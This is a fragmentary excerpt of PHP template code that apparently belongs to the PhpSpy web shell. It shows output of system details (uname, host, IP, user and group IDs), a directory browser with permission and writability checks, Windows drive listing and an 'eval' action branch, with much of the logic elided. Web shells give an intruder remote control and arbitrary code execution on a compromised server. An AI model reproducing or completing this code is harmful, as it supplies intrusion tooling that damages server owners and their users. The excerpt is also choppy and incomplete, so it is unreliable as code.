...
?><?php echo $charset;?><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?><?php
...
?><?php echo @php_uname();?><?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?><?php echo $_SERVER['HTTP_HOST'];?><?php echo gethostbyname($_SERVER['SERVER_NAME']);?><?php
			makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'onchange'=>'g(null,null,null,null,null,null,this.value);'));
			?><?php echo $charset;?><?php echo $charset;?><?php echo $charset;?><?php echo $charset;?><?php echo $charset;?><?php echo $charset;?><?php echo $charset;?><?php if (!IS_WIN) {?><?php echo $charset;?><?php }?><?php
$errmsg && m($errmsg);
...
?><?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?><?php echo $dir_writeable;?><?php echo $dir_writeable;?><?php echo getChmod($cwd);?><?php echo $cwd;?><?php
	if (IS_WIN) {
		$comma = '';
		p('<div class="drives">');
...
elseif ($act == 'eval') {
	...
	?><?php echo str_replace('.','','P.h.p.S.p.y');?><?php
